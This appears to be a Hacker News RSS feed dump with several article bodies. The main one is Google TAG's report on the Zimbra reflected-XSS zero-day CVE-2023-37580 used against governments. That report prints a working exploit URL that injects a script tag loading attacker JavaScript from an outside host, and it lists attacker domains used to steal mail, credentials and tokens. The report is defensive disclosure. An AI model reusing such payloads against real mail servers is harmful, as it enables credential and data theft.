<figure><img decoding="async" width="1024" height="856" src="https://www.securityweek.com/wp-content/uploads/2023/11/ransomware-SEC-complaint-2-1024x856.png" alt="Complaint filed with the SEC against MeridianLink" srcset="https://www.securityweek.com/wp-content/uploads/2023/11/ransomware-SEC-complaint-2-1024x856.png 1024w, https://www.securityweek.com/wp-content/uploads/2023/11/ransomware-SEC-complaint-2-360x301.png 360w, https://www.securityweek.com/wp-content/uploads/2023/11/ransomware-SEC-complaint-2-768x642.png 768w, https://www.securityweek.com/wp-content/uploads/2023/11/ransomware-SEC-complaint-2.png 1120w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Screenshot showing the complaint filed with the SEC against MeridianLink</figcaption></figure></div>
<p>This appears to be the first time a ransomware group has filed an SEC complaint against one of its victims.&nbsp;
</p><p>The hackers told <a href="https://www.databreaches.net/alphv-files-an-sec-complaint-against-meridianlink-for-not-disclosing-a-breach-to-the-sec/">DataBreaches.net</a> that the attack against MeridianLink — which allegedly did not involve file-encrypting ransomware, only data theft — was conducted on November 7 and it was discovered the same day.&nbsp;
</p><p>However, MeridianLink told DataBreaches.net that the intrusion occurred on November 10.
</p><p>“Upon discovery on the same day, we acted immediately to contain the threat and engaged a team of third-party experts to investigate the incident. Based on our investigation to date, we have identified no evidence of unauthorized access to our production platforms, and the incident has caused minimal business interruption,” the company said, adding that it cannot share further details due to its ongoing investigation.&nbsp;</p>
<p>It’s worth pointing out that the new SEC data breach disclosure rules will only go into effect in mid-December 2023. In addition, companies will be required to notify the SEC within four business days of determining that a cybersecurity incident is material to investors, which, based on MeridianLink’s statement, has yet to happen.
</p><p>Contacted by <em>SecurityWeek</em>, an SEC spokesperson declined to comment.
</p><p><a href="https://www.securityweek.com/fbi-shares-information-blackcat-ransomware-attacks/">BlackCat</a> has been one of the most active ransomware operations and it’s not uncommon for the group to try new methods for convincing targets to pay up, including by setting up <a href="https://www.securityweek.com/alphv-ransomware-operators-pressure-victim-dedicated-leak-site/">dedicated leak websites</a> for individual victims.&nbsp;
</p><p><em>*updated to say that the SEC declined to comment</em>
</p><p><strong>Related</strong>: <a href="https://www.securityweek.com/blackcat-ransomware-targets-industrial-companies/">BlackCat Ransomware Targets Industrial Companies</a>
</p><p><strong>Related</strong>: <a href="https://www.securityweek.com/western-digital-confirms-ransomware-group-stole-customer-information/">Western Digital Confirms Ransomware Group Stole Customer Information</a>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Zimbra 0-day used to steal email data from government organizations (106 pts)]]></title>
            <link>https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/</link>
            <guid>38291199</guid>
            <pubDate>Thu, 16 Nov 2023 16:04:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/">https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/</a>, See on <a href="https://news.ycombinator.com/item?id=38291199">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="jump-content" tabindex="-1">
            

    
    

    <article ng-init="drawerToggle = {'open': true}">

    
    





    

    
      

<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
  }">
  <p>Maddie Stone</p>
  
    <p>
      Threat Analysis Group
    </p>
  
  
</div>

    

    
      







<div>
    <figure>
      <div>
  <p><img srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-600.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-1600.format-webp.webp 1600w" sizes="(max-width: 599px) 100vw, (max-width: 1023px) 600px, 1024px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-1200.format-webp.webp" fetchpriority="high" alt="a blue box that reads &quot;Threat Analysis Group&quot;">
  </p>
</div>

      
    </figure>
  </div>


    

    
    <div data-reading-time="true" data-component="uni-drop-cap|uni-tombstone">
            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><p data-block-key="5pdnv">In June 2023, Google’s Threat Analysis Group (TAG) discovered an in-the-wild 0-day exploit targeting Zimbra Collaboration, an email server many organizations use to host their email. Since discovering the 0-day, now patched as <a href="https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories" rt-link-type="external">CVE-2023-37580</a>, TAG has observed four different groups exploiting the same bug to steal email data, user credentials, and authentication tokens. Most of this activity occurred after the initial fix became public on Github. To ensure protection against these types of exploits, TAG urges users and organizations to keep software fully up-to-date and apply security updates as soon as they become available.</p><h3 data-block-key="e1boa">0-day discovery, hotfix and patch</h3><p data-block-key="88it1">TAG first discovered the 0-day, a reflected cross-site scripting (XSS) vulnerability, in June when it was actively exploited in targeted attacks against Zimbra’s email server. Zimbra pushed a hotfix to their <a href="https://github.com/Zimbra/zm-web-client/pull/827/commits/4d563480a73c806617b3da7b457ef65861ea2b9f" rt-link-type="external">public Github on July 5, 2023</a> and published an <a href="https://info.zimbra.com/security-update-zimbra-collaboration-suite-version-8.8.15-important" rt-link-type="external">initial advisory</a> with remediation guidance on July 13, 2023. They <a href="https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories" rt-link-type="external">patched the vulnerability as CVE-2023-37580</a> on July 25, 2023.</p><p data-block-key="7b3cm">TAG observed three threat groups exploiting the vulnerability prior to the release of the official patch, including groups that may have learned about the bug after the fix was initially made public on Github. TAG discovered a fourth campaign using the XSS vulnerability after the official patch was released. Three of these campaigns began after the hotfix was initially made public highlighting the importance of organizations applying fixes as quickly as possible.</p></div>
  

  
    







  
      <div data-analytics-module="{
          &quot;module_name&quot;: &quot;Inline Images&quot;,
          &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
        }">
  

  <p><img alt="image of CVE-2023-37580 exploitation timeline. June 29, 2023 campaign #1 targets Greece, with hotfix pushed to Github, July 5. Campain #2 targets Moldova and Tunisia, July 11, with advisory published, July 13. Campaign #3 targets Vietnam, July 20, 2023, with official patch released as CVE-2023-37580. Campaign #4 targets Pakistan, August 25, 2023." src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/EXPLOIT_TIMELINE_FOR_TAG-01.width-100.format-webp.webp" loading="lazy" data-loading="{
                &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/EXPLOIT_TIMELINE_FOR_TAG-01.width-500.format-webp.webp&quot;,
                &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/EXPLOIT_TIMELINE_FOR_TAG-01.width-1000.format-webp.webp&quot;
              }">
        
      
    
    </p>
    
  
    </div>
  



  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">The Vulnerability CVE-2023-37580</h3><p data-block-key="9j5h">CVE-2023-37580 is a reflected cross-site scripting (XSS) vulnerability. XSS is a web application vulnerability that allows malicious scripts to be injected into another website. In this case, there was a vulnerability in Zimbra that injected the parameter within the URL directly into the webpage, causing the script to be executed. An example that could trigger the XSS is:</p><p data-block-key="2hman">https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2F</p><p data-block-key="52sp2">which decodes to:</p><p data-block-key="72pgk">https://mail.REDACTED[.]com/m/momoveto?st=acg"/&gt;&lt;script src="https://REDACTED/script.js"&gt;&lt;/script&gt;//</p><p data-block-key="1kvmk">The fix was to escape the contents of the st parameter before it was set as the value in an html object.</p></div>
  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">Campaign 1: First known exploitation leads to email-stealing framework</h3><p data-block-key="5qiru">The initial in-the-wild discovery of the 0-day vulnerability was a campaign targeting a government organization in Greece. The attackers sent emails containing exploit urls to their targets. If a target clicked the link during a logged-in Zimbra session, the url loaded the same framework that <a href="https://www.volexity.com/blog/2022/02/03/operation-emailthief-active-exploitation-of-zero-day-xss-vulnerability-in-zimbra/" rt-link-type="external">Volexity documented</a> in February 2022. This framework uses the XSS to steal users’ mail data, such as emails and attachments and to set up an auto-forwarding rule to an attacker-controlled email address. The framework was loaded from:</p><p data-block-key="57r9q">https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js</p></div>
  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">Campaign 2: Winter Vivern exploitation after hotfix pushed to Github</h3><p data-block-key="9o3sb">The patch for the vulnerability was pushed to Github on July 5. Another actor exploited the vulnerability for a full two weeks beginning on July 11 before the official patch became available on July 25. TAG identified multiple exploit urls that targeted government organizations in Moldova and Tunisia; each url contained a unique official email address for specific organizations in those governments. TAG attributes this activity to Winter Vivern (UNC4907), an APT group known to exploit XSS in <a href="https://www.proofpoint.com/us/blog/threat-insight/exploitation-dish-best-served-cold-winter-vivern-uses-known-zimbra-vulnerability" rt-link-type="external">Zimbra</a> and <a href="https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers/" rt-link-type="external">Roundcube</a>. The vulnerability was used to load scripts at:<br></p><p data-block-key="ajbqh">https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.js</p><p data-block-key="1udng">https://applicationdevsoc[.]com/tndgt/auth.js</p></div>
  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">Campaign 3: Exploit used for credential phishing</h3><p data-block-key="5p2nd">Days before Zimbra pushed their official patch on July 25, TAG observed a third, unidentified group exploiting the vulnerability as part of a campaign that phished for credentials belonging to a government organization in Vietnam. In this case, the exploit url pointed to a script that displayed a phishing page for users’ webmail credentials and posted stolen credentials to a url hosted on an official government domain that the attackers likely compromised.</p></div>
  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">Campaign 4: N-day exploit used for stealing authentication token</h3><p data-block-key="5nogp">In August 2023, after the patch for CVE-2023-37580 was released, TAG discovered a fourth campaign using the vulnerability against a government organization in Pakistan. The exploit was used to steal the Zimbra authentication token. The token was exfiltrated to ntcpk[.]org.</p></div>
  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">Conclusion</h3><p data-block-key="fm01h">The discovery of at least four campaigns exploiting CVE-2023-37580, three campaigns after the bug first became public, demonstrates the importance of organizations applying fixes to their mail servers as soon as possible. These campaigns also highlight how attackers monitor open-source repositories to opportunistically exploit vulnerabilities where the fix is in the repository, but not yet released to users. The actors behind Campaign #2 began exploiting the bug after the fix was pushed to Github, but before Zimbra publicly released the advisory with remediation advice.</p><p data-block-key="21ja0">The exploitation of CVE-2023-37580 comes on the heels of CVE-2022-24682, another reflected XSS vulnerability in Zimbra mail servers that was actively exploited in-the-wild in 2022 and is followed by the exploitation of CVE-2023-5631, a XSS vulnerability in Roundcube mail servers just this past month. The regular exploitation of XSS vulnerabilities in mail servers also shows a need for further code auditing of these applications, especially for XSS vulnerabilities.</p><p data-block-key="a4v7o">We’d like to acknowledge Zimbra for their response and patching of this vulnerability. Following our<a href="https://about.google/appsecurity/" rt-link-type="external"> disclosure policy</a>, TAG shares its research to raise awareness and advance security across the ecosystem. We also add all identified websites and domains to Safe Browsing to safeguard users from further exploitation. We urge users and organizations to apply patches quickly and keep software fully up-to-date for their protection. TAG will remain focused on detecting, analyzing, and preventing 0-day exploitation as well as reporting vulnerabilities to vendors immediately upon discovery.</p></div>
  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Zimbra 0\u002Dday used to target international government organizations&quot;
         }"><h3 data-block-key="9k28a">Indicators of compromise (IoCs)</h3><ul><li data-block-key="cnmod">https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js</li><li data-block-key="8jrue">https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.js</li><li data-block-key="9u081">https://applicationdevsoc[.]com/tndgt/auth.js</li><li data-block-key="9u2u3">ntcpk[.]org</li></ul><p data-block-key="2i8vs"><i>Thanks to TAG's Kristen Dennesen who also contributed to this report.</i></p></div>
  


            
            

            
              




            
          </div>
  </article>
  




  

  


<div data-component="uni-related-articles" data-analytics-module="{
    &quot;module_name&quot;: &quot;Article Footer Related Stories&quot;,
    &quot;section_header&quot;: &quot;Related stories&quot;
  }">
    <div>
        <h3>
          <p>
            Related stories
          </p>
        </h3>
      </div>
    <div>
      <ul aria-role="menu" aria-label="Related articles">
        
          <li>
            <a href="https://blog.google/threat-analysis-group/government-backed-actors-exploiting-winrar-vulnerability/" data-index="1" data-target="card" data-primarytag="topics - threat analysis group" data-image="false" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;Government\u002Dbacked actors exploiting WinRAR vulnerability&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/threat-analysis-group/government-backed-actors-exploiting-winrar-vulnerability/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;1&quot;,
                &quot;related_article_tag&quot;: &quot;topics - threat analysis group&quot;,
                &quot;article_name&quot;: &quot;Government\u002Dbacked actors exploiting WinRAR vulnerability&quot;,
                &quot;author_name&quot;: &quot;Kate Morgan&quot;
              }">
              <div data-target="card">
                
                <p><span data-target="eyebrow">Threat Analysis Group</span></p><h4 data-target="title">Government-backed actors exploiting WinRAR vulnerability</h4>
                
                  <p data-target="abstract">Google's Threat Analysis Group analyzes recent state-sponsored campaigns exploiting the WinRAR vulnerability, CVE-2023-38831.</p>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    <span data-target="author">
                    Kate Morgan
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 18, 2023</span>
              </p></div>
              <svg role="presentation" data-target="arrow">
                <use xlink:href="/static/blogv2/images/icons.svg#mi-arrow-forward-no-bg"></use>
              </svg>
            </a>
          </li>
        
          <li>
            <a href="https://blog.google/threat-analysis-group/tag-bulletin-q3-2023/" data-index="2" data-target="card" data-primarytag="topics - threat analysis group" data-image="false" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;TAG Bulletin: Q3 2023&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/threat-analysis-group/tag-bulletin-q3-2023/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;2&quot;,
                &quot;related_article_tag&quot;: &quot;topics - threat analysis group&quot;,
                &quot;article_name&quot;: &quot;TAG Bulletin: Q3 2023&quot;,
                &quot;author_name&quot;: &quot;Shane Huntley&quot;
              }">
              <div data-target="card">
                
                <p><span data-target="eyebrow">Threat Analysis Group</span></p><h4 data-target="title">TAG Bulletin: Q3 2023</h4>
                
                  <p data-target="abstract">This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2023. It was last updated on November 8, 2023.</p>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    <span data-target="author">
                    Shane Huntley
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 05, 2023</span>
              </p></div>
              <svg role="presentation" data-target="arrow">
                <use xlink:href="/static/blogv2/images/icons.svg#mi-arrow-forward-no-bg"></use>
              </svg>
            </a>
          </li>
        
          <li>
            <a href="https://blog.google/threat-analysis-group/0-days-exploited-by-commercial-surveillance-vendor-in-egypt/" data-index="3" data-target="card" data-primarytag="topics - threat analysis group" data-image="false" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;0\u002Ddays exploited by commercial surveillance vendor in Egypt&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/threat-analysis-group/0-days-exploited-by-commercial-surveillance-vendor-in-egypt/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;3&quot;,
                &quot;related_article_tag&quot;: &quot;topics - threat analysis group&quot;,
                &quot;article_name&quot;: &quot;0\u002Ddays exploited by commercial surveillance vendor in Egypt&quot;,
                &quot;author_name&quot;: &quot;Maddie Stone&quot;
              }">
              <div data-target="card">
                
                <p><span data-target="eyebrow">Threat Analysis Group</span></p><h4 data-target="title">0-days exploited by commercial surveillance vendor in Egypt</h4>
                
                  <p data-target="abstract">Last week Google’s Threat Analysis Group (TAG), in partnership with The Citizen Lab, discovered an in-the-wild 0-day exploit chain for iPhones. Developed by the commerci…</p>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    <span data-target="author">
                    Maddie Stone
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Sep 22, 2023</span>
              </p></div>
              <svg role="presentation" data-target="arrow">
                <use xlink:href="/static/blogv2/images/icons.svg#mi-arrow-forward-no-bg"></use>
              </svg>
            </a>
          </li>
        
          <li>
            <a href="https://blog.google/threat-analysis-group/active-north-korean-campaign-targeting-security-researchers/" data-index="4" data-target="card" data-primarytag="topics - threat analysis group" data-image="false" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;Active North Korean campaign targeting security researchers&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/threat-analysis-group/active-north-korean-campaign-targeting-security-researchers/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;4&quot;,
                &quot;related_article_tag&quot;: &quot;topics - threat analysis group&quot;,
                &quot;article_name&quot;: &quot;Active North Korean campaign targeting security researchers&quot;,
                &quot;author_name&quot;: &quot;Clement Lecigne, Maddie Stone&quot;
              }">
              <div data-target="card">
                
                <p><span data-target="eyebrow">Threat Analysis Group</span></p><h4 data-target="title">Active North Korean campaign targeting security researchers</h4>
                
                  <p data-target="abstract">Threat Analysis Group shares findings on a new campaign by North Korean actors targeting security researchers.</p>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    <span data-target="author">
                    Clement Lecigne
                    </span>
                  
                    <span data-target="author">
                    Maddie Stone
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Sep 07, 2023</span>
              </p></div>
              <svg role="presentation" data-target="arrow">
                <use xlink:href="/static/blogv2/images/icons.svg#mi-arrow-forward-no-bg"></use>
              </svg>
            </a>
          </li>
        
          <li>
            <a href="https://blog.google/threat-analysis-group/tag-bulletin-q2-2023/" data-index="5" data-target="card" data-primarytag="topics - threat analysis group" data-image="false" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;TAG Bulletin: Q2 2023&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/threat-analysis-group/tag-bulletin-q2-2023/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;5&quot;,
                &quot;related_article_tag&quot;: &quot;topics - threat analysis group&quot;,
                &quot;article_name&quot;: &quot;TAG Bulletin: Q2 2023&quot;,
                &quot;author_name&quot;: &quot;Shane Huntley&quot;
              }">
              <div data-target="card">
                
                <p><span data-target="eyebrow">Threat Analysis Group</span></p><h4 data-target="title">TAG Bulletin: Q2 2023</h4>
                
                  <p data-target="abstract">Threat Analysis Group shares their Q2 2023 bulletin.</p>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    <span data-target="author">
                    Shane Huntley
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Jul 31, 2023</span>
              </p></div>
              <svg role="presentation" data-target="arrow">
                <use xlink:href="/static/blogv2/images/icons.svg#mi-arrow-forward-no-bg"></use>
              </svg>
            </a>
          </li>
        
          <li>
            <a href="https://blog.google/threat-analysis-group/0-days-exploited-wild-2022/" data-index="6" data-target="card" data-primarytag="topics - threat analysis group" data-image="false" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;The ups and downs of 0\u002Ddays&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/threat-analysis-group/0-days-exploited-wild-2022/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;6&quot;,
                &quot;related_article_tag&quot;: &quot;topics - threat analysis group&quot;,
                &quot;article_name&quot;: &quot;The ups and downs of 0\u002Ddays&quot;,
                &quot;author_name&quot;: &quot;Maddie Stone&quot;
              }">
              <div data-target="card">
                
                <p><span data-target="eyebrow">Threat Analysis Group</span></p><h4 data-target="title">The ups and downs of 0-days</h4>
                
                  <p data-target="abstract">The goal of this report is to analyze the exploits from the year as a whole, looking for trends, gaps, lessons learned, and successes.</p>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    <span data-target="author">
                    Maddie Stone
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Jul 27, 2023</span>
              </p></div>
              <svg role="presentation" data-target="arrow">
                <use xlink:href="/static/blogv2/images/icons.svg#mi-arrow-forward-no-bg"></use>
              </svg>
            </a>
          </li>
        
        <li>.</li>
      </ul>
    </div>
    
      
    
 </div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Emu Video and Emu Edit, our latest generative AI research milestones (155 pts)]]></title>
            <link>https://ai.meta.com/blog/emu-text-to-video-generation-image-editing-research/</link>
            <guid>38291139</guid>
            <pubDate>Thu, 16 Nov 2023 15:59:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ai.meta.com/blog/emu-text-to-video-generation-image-editing-research/">https://ai.meta.com/blog/emu-text-to-video-generation-image-editing-research/</a>, See on <a href="https://news.ycombinator.com/item?id=38291139">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p>The field of generative AI is rapidly evolving, showing remarkable potential to augment human creativity and self-expression. In 2022, we made the leap from <a href="https://ai.meta.com/blog/greater-creative-control-for-ai-image-generation/" target="_blank" data-lnfb-mode="ie"><u>image generation</u></a> to <a href="https://ai.meta.com/blog/generative-ai-text-to-video/" target="_blank" data-lnfb-mode="ie"><u>video generation</u></a> in the span of a few months. And at this year’s Meta Connect, we announced several<a href="https://about.fb.com/news/2023/09/introducing-ai-powered-assistants-characters-and-creative-tools/" target="_blank" data-lnfb-mode="ie"><u> new developments</u></a>, including <a href="https://ai.meta.com/research/publications/emu-enhancing-image-generation-models-using-photogenic-needles-in-a-haystack/" target="_blank" data-lnfb-mode="ie"><u>Emu</u></a>, our first foundational model for image generation. Technology from Emu underpins many of our generative AI experiences, some AI image editing tools for Instagram that let you take a photo and change its visual style or background, and the Imagine feature within Meta AI that lets you generate photorealistic images directly in messages with that assistant or in group chats across our family of apps. Our work in this exciting field is ongoing, and today, we’re announcing new research into controlled image editing based solely on text instructions and a method for text-to-video generation based on diffusion models.</p><br></div><div><p>Emu Video: A simple factorized method for high-quality video generation</p></div><div><p>Whether or not you’ve personally used an AI image generation tool, you’ve likely seen the results: Visually distinct, often highly stylized and detailed, these images on their own can be quite striking—and the impact increases when you bring them to life by adding movement.</p><br></div></div><div><p>With Emu Video, which leverages our Emu model, we present a simple method for text-to-video generation based on diffusion models. This is a unified architecture for video generation tasks that can respond to a variety of inputs: text only, image only, and both text and image. We’ve split the process into two steps: first, generating images conditioned on a text prompt, and then generating video conditioned on both the text and the generated image. This “factorized” or split approach to video generation lets us train video generation models efficiently. We show that factorized video generation can be implemented via a single diffusion model. We present critical design decisions, like adjusting noise schedules for video diffusion, and multi-stage training that allows us to directly generate higher-resolution videos.</p><br></div><div><div><p>Unlike prior work that requires a deep cascade of models (e.g., five models for <a href="https://ai.meta.com/blog/generative-ai-text-to-video/" target="_blank" data-lnfb-mode="ie"><u>Make-A-Video</u></a>), our state-of-the-art approach is simple to implement and uses just two diffusion models to generate 512x512 four-second long videos at 16 frames per second. In human evaluations, our video generations are strongly preferred compared to prior work—in fact, this model was preferred over Make-A-Video by 96% of respondents based on quality and by 85% of respondents based on faithfulness to the text prompt. Finally, the same model can “animate” user-provided images based on a text prompt where it once again sets a new state-of-the-art outperforming prior work by a significant margin.</p><br></div><p><img src="https://scontent.fzrh3-1.fna.fbcdn.net/v/t39.2365-6/400716824_1091119852252102_4469709282943793457_n.png?_nc_cat=106&amp;ccb=1-7&amp;_nc_sid=e280be&amp;_nc_ohc=b_MVYm_ul4YAX-EKAYv&amp;_nc_ht=scontent.fzrh3-1.fna&amp;oh=00_AfC8ATmq88CnN2ueiKd-rpWFjvNADOIy0mnTYftaeRbI3Q&amp;oe=6570C000" alt="" id="u_0_l_n6"></p><div><p>Emu Edit: Precise image editing via recognition and generation tasks</p></div><div><p>Of course, the use of generative AI is often a process. You try a prompt, the generated image isn’t <i>quite</i> what you had in mind, so you continue tweaking the prompt until you get to a more desired outcome. That’s why prompt engineering has become a thing. And while instructable image generative models have made significant strides in recent years, they still face limitations when it comes to offering precise control. That’s why we’re introducing Emu Edit, a novel approach that aims to streamline various image manipulation tasks and bring enhanced capabilities and precision to image editing.</p><br></div><div><p>Emu Edit is capable of free-form editing through instructions, encompassing tasks such as local and global editing, removing and adding a background, color and geometry transformations, detection and segmentation, and more. Current methods often lean towards either over-modifying or under-performing on various editing tasks. We argue that the primary objective shouldn’t just be about producing a “believable” image. Instead, the model should focus on precisely altering only the pixels relevant to the edit request. Unlike many generative AI models today, Emu Edit precisely follows instructions, ensuring that pixels in the input image unrelated to the instructions remain untouched. For instance, when adding the text “Aloha!” to a baseball cap, the cap itself should remain unchanged.</p><br></div><div><p>Our key insight is that incorporating computer vision tasks as instructions to image generation models offers unprecedented control in image generation and editing. Through a detailed examination of both local and global editing tasks, we highlight the vast potential of Emu Edit in executing detailed edit instructions.</p><p>In order to train the model, we’ve developed a dataset that contains 10 million synthesized samples, each including an input image, a description of the task to be performed, and the targeted output image. We believe it’s the largest dataset of its kind to date. As a result, our model displays unprecedented edit results in terms of both instruction faithfulness and image quality. In our evaluations, Emu Edit demonstrates superior performance over current methods, producing new state-of-the-art results in both qualitative and quantitative evaluations for a range of image editing tasks.</p></div><p>The road ahead</p><div><p>Although this work is purely fundamental research right now, the potential use cases are clearly evident. Imagine generating your own animated stickers or clever GIFs on the fly to send in the group chat rather than having to search for the perfect media for your reply. Or editing your own photos and images, no technical skills required. Or adding some extra oomph to your Instagram posts by animating static photos. Or generating something entirely new.</p><p>While certainly no replacement for professional artists and animators, Emu Video, Emu Edit, and new technologies like them could help people express themselves in new ways—from an art director ideating on a new concept or a creator livening up their latest reel to a best friend sharing a unique birthday greeting. And we think that’s something worth celebrating.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sweden Gov Announces 'Massive Expansion' of Nuclear Energy (240 pts)]]></title>
            <link>https://greeninvesting.co/2023/11/sweden-gov-announces-massive-expansion-of-nuclear-energy/</link>
            <guid>38291015</guid>
            <pubDate>Thu, 16 Nov 2023 15:48:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://greeninvesting.co/2023/11/sweden-gov-announces-massive-expansion-of-nuclear-energy/">https://greeninvesting.co/2023/11/sweden-gov-announces-massive-expansion-of-nuclear-energy/</a>, See on <a href="https://news.ycombinator.com/item?id=38291015">Hacker News</a></p>
Couldn't get https://greeninvesting.co/2023/11/sweden-gov-announces-massive-expansion-of-nuclear-energy/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[From email to phone number, a new OSINT approach (2019) (225 pts)]]></title>
            <link>https://www.martinvigo.com/email2phonenumber/</link>
            <guid>38290613</guid>
            <pubDate>Thu, 16 Nov 2023 15:20:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.martinvigo.com/email2phonenumber/">https://www.martinvigo.com/email2phonenumber/</a>, See on <a href="https://news.ycombinator.com/item?id=38290613">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="site-content">

<main id="site-main" role="main">

			
<article id="post-864">
		
	
	<div>
				<p>Lately I’ve been spending time researching weaknesses and attack vectors in password reset options. <a href="https://www.youtube.com/watch?v=7MbgFTJrhss" target="_blank" rel="noopener noreferrer">At BSides Las Vegas I presented a tool called “Ransombile”</a>. It automates the password reset process over SMS for many Alexa top 100 websites and facilitates targeted attacks when having physical access to locked mobile devices for a short period of time. <a href="https://www.youtube.com/watch?v=ZpZbTPYB3cU" target="_blank" rel="noopener noreferrer">I’ve also talked about the wide impact of compromising voicemail systems at DEF CON</a> and <a href="https://www.youtube.com/watch?v=E4UPlB2l8t8" target="_blank" rel="noopener noreferrer">CCC</a> by abusing password reset over phone calls.</p>
<p>While working on these topics, I spent many hours testing and resetting passwords in various different websites. At some point, I started noticing a pattern I hadn’t noticed before. When you want to reset a password, you enter the email and are then presented with different options. Those usually include receiving an email with a unique link to click on, getting an SMS with a secret six digit code or even the option to receive a call and hear the secret code instead.</p>

